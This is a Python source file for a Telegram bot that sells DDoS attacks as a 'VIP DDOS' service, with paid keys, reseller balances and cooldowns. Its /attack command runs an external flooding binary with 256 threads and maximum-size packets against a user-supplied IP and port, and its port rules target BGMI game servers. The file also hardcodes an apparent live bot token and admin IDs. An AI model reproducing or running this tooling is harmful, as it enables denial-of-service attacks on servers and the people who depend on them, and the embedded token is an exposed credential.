import os
import json
import time
import telebot
import datetime
import subprocess
import threading
from dateutil.relativedelta import relativedelta
import pytz
import psutil
import signal
import re

# Set Indian Standard Time (IST) timezone
IST = pytz.timezone('Asia/Kolkata')

# Telegram bot token
bot = telebot.TeleBot('7520138270:AAFAdGncvbChu5zwtWqnP1CYd_IAAkHZzMM')  # Replace with your bot token from BotFather

# Admin user IDs
admin_id = {"1807014348", "6258297180", "6955279265"}

# Files for data storage
USER_FILE = "users.json"
LOG_FILE = "log.txt"
KEY_FILE = "keys.json"
RESELLERS_FILE = "resellers.json"
AUTHORIZED_USERS_FILE = "authorized_users.json"
BLOCK_ERROR_LOG = "block_error_log.txt"
ATTACK_STATE_FILE = "attack_state.json"

# Per key cost for resellers
KEY_COST = {"1min": 5, "1h": 10, "1d": 100, "7d": 450, "1m": 900}

# Valid BGMI port range and incorrect ports
BGMI_PORT_RANGE_START = 16000
BGMI_PORT_RANGE_END = 65535
INCORRECT_PORTS = {443, 8700, 17500, 9031, 20000, 20001, 20002}

# In-memory storage
users = {}
keys = {}
authorized_users = {}
last_attack_time = {}
running_attacks = {}  # Track running attack processes
COOLDOWN_PERIOD = 60  # Default cooldown in seconds
DEFAULT_THREADS = 256
DEFAULT_PACKET_SIZE = 65507

def is_sequential_port(port):
    """Check if the port number appears sequential (e.g., 28882, 20000, 20001)."""
    port_str = str(port)
    # Check for repeating digits (e.g., 28882 has '888')
    if re.search(r'(\d)\1{2,}', port_str):
        return True
    # Check for simple patterns like 10000, 20000
    if port_str.endswith('000') or port_str.endswith('00'):
        return True
    # Check for incremental patterns (e.g., 20000, 20001)
    if port_str in [str(i) for i in range(port - 5, port + 6)]:
        return True
    return False

def check_system_resources(chat_id):
    """Check CPU and memory before starting an attack."""
    cpu_usage = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    memory_usage = memory.percent
    if cpu_usage > 90:
        bot.send_message(chat_id, "Error: CPU usage too high (>90%). Try again later.")
        return False
    if memory_usage > 90:
        bot.send_message(chat_id, "Error: Memory usage too high (>90%). Try again later.")
        return False
    return True

def set_cooldown(seconds):
    """Set the global cooldown period."""
    global COOLDOWN_PERIOD
    COOLDOWN_PERIOD = seconds
    with open("cooldown.json", "w") as file:
        json.dump({"cooldown": seconds}, file)
    for admin in admin_id:
        bot.send_message(admin, f"Cooldown updated to {seconds} seconds")

def load_cooldown():
    """Load the cooldown period from file."""
    global COOLDOWN_PERIOD
    try:
        with open("cooldown.json", "r") as file:
            data = json.load(file)
            COOLDOWN_PERIOD = data.get("cooldown", 60)
    except FileNotFoundError:
        COOLDOWN_PERIOD = 60

def load_attack_state():
    """Load running attack processes from file."""
    global running_attacks
    try:
        with open(ATTACK_STATE_FILE, "r") as file:
            data = json.load(file)
            for attack_id, info in data.items():
                pid = info["pid"]
                if psutil.pid_exists(pid):
                    running_attacks[attack_id] = {
                        "pid": pid,
                        "target": info["target"],
                        "port": info["port"],
                        "time": info["time"],
                        "start_time": datetime.datetime.fromisoformat(info["start_time"]).replace(tzinfo=IST),
                        "chat_id": info["chat_id"],
                        "username": info["username"],
                        "process": None  # Reinitialized below
                    }
    except FileNotFoundError:
        running_attacks = {}

def save_attack_state():
    """Save running attack processes to file."""
    with open(ATTACK_STATE_FILE, "w") as file:
        data = {
            attack_id: {
                "pid": info["pid"],
                "target": info["target"],
                "port": info["port"],
                "time": info["time"],
                "start_time": info["start_time"].isoformat(),
                "chat_id": info["chat_id"],
                "username": info["username"]
            } for attack_id, info in running_attacks.items()
        }
        json.dump(data, file)

def load_data():
    """Load all data."""
    global users, keys, authorized_users
    try:
        users = read_users()
        keys = read_keys()
        authorized_users = read_authorized_users()
        load_cooldown()
        load_attack_state()
    except Exception as e:
        print(f"Error loading data: {str(e)}")
        users = {}
        keys = {}
        authorized_users = {}
        running_attacks = {}

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_users():
    try:
        with open(USER_FILE, "w") as file:
            json.dump(users, file)
    except Exception as e:
        print(f"Error saving users: {str(e)}")

def read_keys():
    try:
        with open(KEY_FILE, "r") as file:
            data = json.load(file)
            for key, value in data.items():
                if "generated_time" not in value:
                    value["generated_time"] = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
                    value["generated_by"] = "Unknown"
            return data if isinstance(data, dict) else {}
    except FileNotFoundError:
        print(f"{KEY_FILE} not found, initializing empty keys.")
        return {}
    except json.JSONDecodeError:
        print(f"Error decoding {KEY_FILE}, initializing empty keys.")
        return {}

def save_keys():
    try:
        with open(KEY_FILE, "w") as file:
            json.dump(keys, file, indent=4)
    except Exception as e:
        print(f"Error saving keys: {str(e)}")

def read_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}

def save_authorized_users():
    try:
        with open(AUTHORIZED_USERS_FILE, "w") as file:
            json.dump(authorized_users, file)
    except Exception as e:
        print(f"Error saving authorized users: {str(e)}")

def parse_duration(duration_str):
    duration_str = duration_str.lower().replace("minutes", "min").replace("hours", "h").replace("days", "d").replace("months", "m")
    import re
    match = re.match(r"(\d+)([minhdm])", duration_str)
    if not match:
        return None, None, None, None
    value = int(match.group(1))
    unit = match.group(2)
    if unit == "min":
        if value < 1 or value > 59:
            return None, None, None, None
        return value, 0, 0, 0
    elif unit == "h":
        return 0, value, 0, 0
    elif unit == "d":
        return 0, 0, value, 0
    elif unit == "m":
        return 0, 0, 0, value
    return None, None, None, None

def add_time_to_current_date(years=0, months=0, days=0, hours=0, minutes=0, seconds=0):
    current_time = datetime.datetime.now(IST)
    new_time = current_time + relativedelta(years=years, months=months, days=days, hours=hours, minutes=minutes, seconds=seconds)
    return new_time

def load_resellers():
    try:
        with open(RESELLERS_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except json.JSONDecodeError:
        return {}

def save_resellers(resellers):
    try:
        with open(RESELLERS_FILE, "w") as file:
            json.dump(resellers, file, indent=4)
    except Exception as e:
        print(f"Error saving resellers: {str(e)}")

resellers = load_resellers()

def log_command(user_id, target, port, time):
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else f"UserID: {user_id}"
    with open(LOG_FILE, "a") as file:
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    with open(LOG_FILE, "a") as file:
        log_entry += "\n"
        file.write(log_entry)

def execute_attack(target, port, time, chat_id, username, last_attack_time, user_id):
    try:
        if not check_system_resources(chat_id):
            return
        threads = DEFAULT_THREADS
        packet_size = DEFAULT_PACKET_SIZE
        if packet_size < 1 or packet_size > 65507:
            bot.send_message(chat_id, "Error: Packet size must be between 1 and 65507")
            return
        if not os.path.isfile("./Rohan") or not os.access("./Rohan", os.X_OK):
            bot.send_message(chat_id, "Error: Rohan executable not found or not executable")
            return
        attack_id = f"{user_id}_{int(time.time())}"
        full_command = f"./Rohan {target} {port} {time} {threads} {packet_size} --fixed-port"
        response = f"Attack Started\nID: {attack_id}\nTarget: {target}:{port}\nTime: {time} seconds\nThreads: {threads}\nPacket Size: {packet_size} bytes\nAttacker: @{username}"
        bot.send_message(chat_id, response)
        process = subprocess.Popen(full_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, preexec_fn=os.setsid)
        running_attacks[attack_id] = {
            "pid": process.pid,
            "target": target,
            "port": port,
            "time": time,
            "start_time": datetime.datetime.now(IST),
            "chat_id": chat_id,
            "username": username,
            "process": process
        }
        save_attack_state()
        last_attack_time[user_id] = datetime.datetime.now(IST)
        threading.Timer(time, lambda: send_attack_finished_message(attack_id, chat_id), []).start()
    except Exception as e:
        bot.send_message(chat_id, f"Error executing attack: {str(e)}")
        if attack_id in running_attacks:
            del running_attacks[attack_id]
            save_attack_state()

def send_attack_finished_message(attack_id, chat_id):
    if attack_id in running_attacks:
        attack_info = running_attacks[attack_id]
        process = attack_info["process"]
        try:
            os.killpg(os.getpgid(process.pid), signal.SIGTERM)  # Terminate process group
            stdout, stderr = process.communicate(timeout=5)
        except subprocess.TimeoutExpired:
            os.killpg(os.getpgid(process.pid), signal.SIGKILL)
            stdout, stderr = process.communicate()
        except Exception as e:
            stderr = f"Error terminating process: {str(e)}"
        with open("rohan_output.log", "a") as log_file:
            log_file.write(f"[{datetime.datetime.now(IST)}] Attack ID: {attack_id}\n")
            log_file.write(f"Target: {attack_info['target']}:{attack_info['port']}\n")
            log_file.write(f"STDOUT:\n{stdout}\n")
            log_file.write(f"STDERR:\n{stderr}\n")
        bot.send_message(chat_id, f"Attack completed\nID: {attack_id}\nTarget: {attack_info['target']}:{attack_info['port']}")
        if process.returncode != 0:
            bot.send_message(chat_id, f"Attack failed. Check logs for details.")
            for admin in admin_id:
                bot.send_message(admin, f"Attack failed\nID: {attack_id}\nError: {stderr}")
        del running_attacks[attack_id]
        save_attack_state()

@bot.message_handler(commands=['attack'])
def handle_attack(message):
    user_id = str(message.from_user.id)
    has_access = False
    if user_id in admin_id:
        has_access = True
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                has_access = True
        except ValueError:
            has_access = False
    if not has_access:
        bot.reply_to(message, "Unauthorized Access! Use /redeem <key_name> or contact admin.")
        return
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining_cooldown = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"Cooldown in effect, wait {int(remaining_cooldown)} seconds")
            return
    command = message.text.split()
    if len(command) != 4:
        bot.reply_to(message, "Usage: /attack <ip> <port> <time>")
        return
    target = command[1]
    try:
        port = int(command[2])
        time = int(command[3])
        # Port validation: Allow random ports, reject sequential or incorrect ports
        if port in INCORRECT_PORTS or is_sequential_port(port):
            bot.reply_to(message, "Error: This is a wrong port")
            return
        if time > 86400:
            bot.reply_to(message, "Error: Time must be less than 86400 seconds")
            return
        record_command_logs(user_id, 'attack', target, port, time)
        log_command(user_id, target, port, time)
        username = message.from_user.username or "UserID_" + str(user_id)
        execute_attack(target, port, time, message.chat.id, username, last_attack_time, user_id)
    except ValueError:
        bot.reply_to(message, "Invalid port or time format.")

@bot.message_handler(commands=['attacks'])
def list_attacks(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Running Attacks:\n"
    if running_attacks:
        for attack_id, info in running_attacks.items():
            elapsed = (datetime.datetime.now(IST) - info["start_time"]).total_seconds()
            remaining = info["time"] - elapsed
            response += f"ID: {attack_id}\nTarget: {info['target']}:{info['port']}\nTime Left: {int(remaining)}s\nUser: @{info['username']}\n\n"
    else:
        response = "No running attacks."
    bot.reply_to(message, response)

@bot.message_handler(commands=['stopattack'])
def stop_attack(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /stopattack <attack_id>")
        return
    attack_id = command[1]
    if attack_id in running_attacks:
        attack_info = running_attacks[attack_id]
        try:
            os.killpg(os.getpgid(attack_info["pid"]), signal.SIGTERM)
            attack_info["process"].wait(timeout=5)
            bot.send_message(attack_info["chat_id"], f"Attack stopped\nID: {attack_id}\nTarget: {attack_info['target']}:{attack_info['port']}")
            del running_attacks[attack_id]
            save_attack_state()
        except Exception as e:
            bot.reply_to(message, f"Error stopping attack {attack_id}: {str(e)}")
    else:
        bot.reply_to(message, f"Attack ID {attack_id} not found")

@bot.message_handler(commands=['addreseller'])
def add_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /addreseller <user_id> <balance>")
        return
    reseller_id = command[1]
    try:
        initial_balance = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid balance amount")
        return
    if reseller_id not in resellers:
        resellers[reseller_id] = initial_balance
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller added successfully\nReseller ID: {reseller_id}\nBalance: {initial_balance} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} already exists")

@bot.message_handler(commands=['genkey'])
def generate_key(message):
    user_id = str(message.from_user.id)
    command = message.text.split()
    if user_id in admin_id or user_id in resellers:
        if len(command) != 3:
            bot.reply_to(message, "Usage: /genkey <duration> <key_name>")
            return
        duration = command[1].lower()
        key_name = command[2]
    else:
        bot.reply_to(message, "Access Denied: Admin or reseller only command")
        return
    minutes, hours, days, months = parse_duration(duration)
    if minutes is None and hours is None and days is None and months is None:
        bot.reply_to(message, "Invalid duration. Use formats like 30min, 1h, 1d, 1m")
        return
    cost_duration = duration
    if minutes > 0:
        cost_duration = "1min"
    elif hours >= 24:
        days = hours // 24
        hours = 0
        duration = f"{days}d"
        cost_duration = duration
    elif days >= 30:
        months = days // 30
        days = 0
        duration = f"{months}m"
        cost_duration = duration
    elif months > 0:
        cost_duration = "1m" if months == 1 else f"{months}m"
    elif days > 0:
        cost_duration = "1d" if days == 1 else f"{days}d"
    elif hours > 0:
        cost_duration = "1h" if hours == 1 else f"{hours}h"
    custom_key = f"Rahul_sadiq-{key_name}"
    device_limit = 1
    user_info = bot.get_chat(user_id)
    generated_by = user_info.username if user_info.username else f"UserID_{user_id}"
    key_data = {
        "duration": duration,
        "device_limit": device_limit,
        "devices": keys.get(custom_key, {}).get("devices", []),
        "blocked": keys.get(custom_key, {}).get("blocked", False),
        "generated_time": datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p'),
        "generated_by": generated_by
    }
    keys[custom_key] = key_data
    save_keys()
    for user_id in key_data["devices"]:
        if user_id in users:
            expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
            users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_users()
    response = f"Key {'updated' if custom_key in keys else 'generated'} successfully\nKey: `{custom_key}`\nDuration: {duration}\nDevice Limit: {device_limit}\nGenerated by: @{generated_by}\nGenerated on: {key_data['generated_time']}"
    if user_id in resellers:
        cost = KEY_COST.get(cost_duration, 0)
        if cost > 0:
            resellers[user_id] -= cost
            save_resellers(resellers)
            response += f"\nCost: {cost} Rs\nRemaining balance: {resellers[user_id]} Rs"
    bot.reply_to(message, response, parse_mode='Markdown')

@bot.message_handler(commands=['help'])
def help_command(message):
    help_text = """
VIP DDOS HELP GUIDE
BOT CONTROLS:
- /start - Start the bot
- /help - Show this guide
POWER MANAGEMENT:
- /attack <ip> <port> <time> - Launch an attack
- /attacks - List running attacks (admin only)
- /stopattack <attack_id> - Stop an attack (admin only)
- /setcooldown <seconds> - Set cooldown (admin only)
- /checkcooldown - Check cooldown
- /addreseller <user_id> <balance> - Add reseller (admin only)
- /genkey <duration> <key_name> - Generate key (admin/reseller only)
- /logs - View logs (admin only)
- /users - List authorized users (admin only)
- /add <user_id> - Add user (admin only)
- /remove <user_id> - Remove user (admin only)
- /resellers - View resellers
- /addbalance <reseller_id> <amount> - Add balance (admin only)
- /removereseller <reseller_id> - Remove reseller (admin only)
- /block <key_name> - Block key (admin only)
- /redeem <key_name> - Redeem key
- /balance - Check reseller balance (resellers only)
- /myinfo - View user info
- /listkeys - List keys (admin only)
EXAMPLE:
- /attack 192.168.1.1 27881 4000
- /attacks
- /stopattack <attack_id>
- /genkey 1d rahul
- /redeem Rahul_sadiq-rahul
"""
    bot.reply_to(message, help_text, parse_mode='Markdown')

@bot.message_handler(commands=['balance'])
def check_balance(message):
    user_id = str(message.from_user.id)
    if user_id in resellers:
        current_balance = resellers[user_id]
        response = f"Your current balance is: {current_balance} Rs"
    else:
        response = "Access Denied: Reseller only command"
    bot.reply_to(message, response)

@bot.message_handler(commands=['redeem'])
def redeem_key(message):
    user_id = str(message.from_user.id)
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /redeem <key_name>")
        return
    key = command[1].strip()
    if user_id in admin_id or (user_id in authorized_users and not users.get(user_id)):
        bot.reply_to(message, "Admin/Authorized User: No need to redeem a key.")
        return
    if user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                bot.reply_to(message, f"Active key expires on: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}")
                return
            else:
                del users[user_id]
                save_users()
        except ValueError:
            bot.reply_to(message, "Error: Invalid expiration date. Contact admin.")
            return
    if key in keys:
        if keys[key].get("blocked", False):
            bot.reply_to(message, "Key blocked. Contact admin.")
            return
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            bot.reply_to(message, "Key has reached device limit.")
            return
        if user_id in keys[key]["devices"]:
            bot.reply_to(message, "You already redeemed this key.")
            return
        duration = keys[key]["duration"]
        minutes, hours, days, months = parse_duration(duration)
        if minutes is None and hours is None and days is None and months is None:
            bot.reply_to(message, "Invalid key duration. Contact admin.")
            return
        expiration_time = add_time_to_current_date(months=months, days=days, hours=hours, minutes=minutes)
        users[user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key]["devices"].append(user_id)
        if len(keys[key]["devices"]) >= keys[key]["device_limit"]:
            del keys[key]
        save_users()
        save_keys()
        bot.reply_to(message, f"Key redeemed successfully!\nExpires on: {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")
    else:
        bot.reply_to(message, "Invalid or expired key. Contact admin.")

@bot.message_handler(commands=['block'])
def block_key(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /block <key_name>")
        return
    key_name = command[1].strip()
    if not key_name.startswith("Rahul_sadiq-"):
        bot.reply_to(message, "Invalid key format.")
        return
    if key_name in keys:
        if keys[key_name].get("blocked", False):
            blocker_username = keys[key_name].get("blocked_by_username", "Unknown")
            block_time = keys[key_name].get("blocked_time", "Unknown")
            bot.reply_to(message, f"Key '{key_name}' already blocked by @{blocker_username} on {block_time}")
            return
        user_info = bot.get_chat(user_id)
        blocker_username = user_info.username if user_info.username else f"UserID_{user_id}"
        block_time = datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')
        keys[key_name]["blocked"] = True
        keys[key_name]["blocked_by_username"] = blocker_username
        keys[key_name]["blocked_time"] = block_time
        save_keys()
        bot.reply_to(message, f"Key '{key_name}' blocked by @{blocker_username} on {block_time}")
    else:
        bot.reply_to(message, f"Key '{key_name}' not found.")
        with open(BLOCK_ERROR_LOG, "a") as log_file:
            log_file.write(f"Attempt to block {key_name} at {datetime.datetime.now(IST).strftime('%Y-%m-%d %I:%M:%S %p')} by UserID: {user_id}\n")

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user_id = str(message.from_user.id)
    response = f"User Info:\nUser ID: {user_id}\n"
    if user_id in admin_id:
        response += "Status: Admin\n"
    elif user_id in resellers:
        response += f"Status: Reseller\nBalance: {resellers[user_id]} Rs\n"
    elif user_id in users:
        try:
            expiration_date = datetime.datetime.strptime(users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response += f"Status: Authorized User\nKey Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            else:
                response += "Status: Expired Key\n"
                del users[user_id]
                save_users()
        except ValueError:
            response += "Status: Invalid Key\n"
    elif user_id in authorized_users:
        try:
            expiration_date = datetime.datetime.strptime(authorized_users[user_id], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
            if datetime.datetime.now(IST) < expiration_date:
                response += f"Status: Authorized User\nAccess Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}\n"
            else:
                response += "Status: Expired Authorization\n"
                del authorized_users[user_id]
                save_authorized_users()
        except ValueError:
            response += "Status: Invalid Authorization\n"
    else:
        response += "Status: Unauthorized\nUse /redeem <key_name> to gain access.\n"
    bot.reply_to(message, response)

@bot.message_handler(commands=['users'])
def list_users(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Authorized Users:\n"
    if users or authorized_users:
        for uid in users:
            try:
                expiration_date = datetime.datetime.strptime(users[uid], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                status = "Active" if datetime.datetime.now(IST) < expiration_date else "Expired"
                response += f"User ID: {uid}, Key Expires: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}, Status: {status}\n"
            except ValueError:
                response += f"User ID: {uid}, Key: Invalid\n"
        for uid in authorized_users:
            try:
                expiration_date = datetime.datetime.strptime(authorized_users[uid], '%Y-%m-%d %I:%M:%S %p').replace(tzinfo=IST)
                status = "Active" if datetime.datetime.now(IST) < expiration_date else "Expired"
                response += f"User ID: {uid}, Authorized Until: {expiration_date.strftime('%Y-%m-%d %I:%M:%S %p')}, Status: {status}\n"
            except ValueError:
                response += f"User ID: {uid}, Authorization: Invalid\n"
    else:
        response = "No authorized users."
    bot.reply_to(message, response)

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /add <user_id>")
        return
    new_user_id = command[1]
    expiration_time = add_time_to_current_date(months=1)  # Default 1 month access
    authorized_users[new_user_id] = expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')
    save_authorized_users()
    bot.reply_to(message, f"User {new_user_id} added successfully. Access expires on {expiration_time.strftime('%Y-%m-%d %I:%M:%S %p')}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /remove <user_id>")
        return
    target_user_id = command[1]
    if target_user_id in users:
        del users[target_user_id]
        save_users()
        bot.reply_to(message, f"User {target_user_id} removed from key-based access.")
    elif target_user_id in authorized_users:
        del authorized_users[target_user_id]
        save_authorized_users()
        bot.reply_to(message, f"User {target_user_id} removed from authorized users.")
    else:
        bot.reply_to(message, f"User {target_user_id} not found.")

@bot.message_handler(commands=['resellers'])
def list_resellers(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Resellers:\n"
    if resellers:
        for reseller_id, balance in resellers.items():
            response += f"Reseller ID: {reseller_id}, Balance: {balance} Rs\n"
    else:
        response = "No resellers."
    bot.reply_to(message, response)

@bot.message_handler(commands=['addbalance'])
def add_balance(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 3:
        bot.reply_to(message, "Usage: /addbalance <reseller_id> <amount>")
        return
    reseller_id = command[1]
    try:
        amount = int(command[2])
    except ValueError:
        bot.reply_to(message, "Invalid amount")
        return
    if reseller_id in resellers:
        resellers[reseller_id] += amount
        save_resellers(resellers)
        bot.reply_to(message, f"Added {amount} Rs to Reseller {reseller_id}. New balance: {resellers[reseller_id]} Rs")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} not found.")

@bot.message_handler(commands=['removereseller'])
def remove_reseller(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /removereseller <reseller_id>")
        return
    reseller_id = command[1]
    if reseller_id in resellers:
        del resellers[reseller_id]
        save_resellers(resellers)
        bot.reply_to(message, f"Reseller {reseller_id} removed successfully.")
    else:
        bot.reply_to(message, f"Reseller {reseller_id} not found.")

@bot.message_handler(commands=['listkeys'])
def list_keys(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    response = "Generated Keys:\n"
    if keys:
        for key, info in keys.items():
            response += f"Key: {key}\nDuration: {info['duration']}\nDevice Limit: {info['device_limit']}\nDevices: {info['devices']}\nBlocked: {info.get('blocked', False)}\nGenerated by: @{info['generated_by']}\nGenerated on: {info['generated_time']}\n\n"
    else:
        response = "No keys generated."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def view_logs(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    try:
        with open(LOG_FILE, "r") as file:
            logs = file.read()
            if logs:
                # Split logs into chunks if too long for Telegram
                chunks = [logs[i:i+4096] for i in range(0, len(logs), 4096)]
                for chunk in chunks:
                    bot.reply_to(message, chunk)
            else:
                bot.reply_to(message, "No logs available.")
    except FileNotFoundError:
        bot.reply_to(message, "Log file not found.")

@bot.message_handler(commands=['setcooldown'])
def set_cooldown_command(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_id:
        bot.reply_to(message, "Access Denied: Admin only command")
        return
    command = message.text.split()
    if len(command) != 2:
        bot.reply_to(message, "Usage: /setcooldown <seconds>")
        return
    try:
        seconds = int(command[1])
        if seconds < 0:
            bot.reply_to(message, "Cooldown cannot be negative.")
            return
        set_cooldown(seconds)
        bot.reply_to(message, f"Cooldown set to {seconds} seconds.")
    except ValueError:
        bot.reply_to(message, "Invalid cooldown value.")

@bot.message_handler(commands=['checkcooldown'])
def check_cooldown_command(message):
    user_id = str(message.from_user.id)
    if user_id in last_attack_time:
        time_since_last_attack = (datetime.datetime.now(IST) - last_attack_time[user_id]).total_seconds()
        if time_since_last_attack < COOLDOWN_PERIOD:
            remaining = COOLDOWN_PERIOD - time_since_last_attack
            bot.reply_to(message, f"Cooldown active. Wait {int(remaining)} seconds.")
        else:
            bot.reply_to(message, "No cooldown active. You can launch an attack.")
    else:
        bot.reply_to(message, "No cooldown active. You can launch an attack.")

@bot.message_handler(commands=['start'])
def start_command(message):
    bot.reply_to(message, "Welcome to the VIP DDOS Bot! Use /help to see available commands.")

# Initialize data and start the bot
load_data()
bot.polling()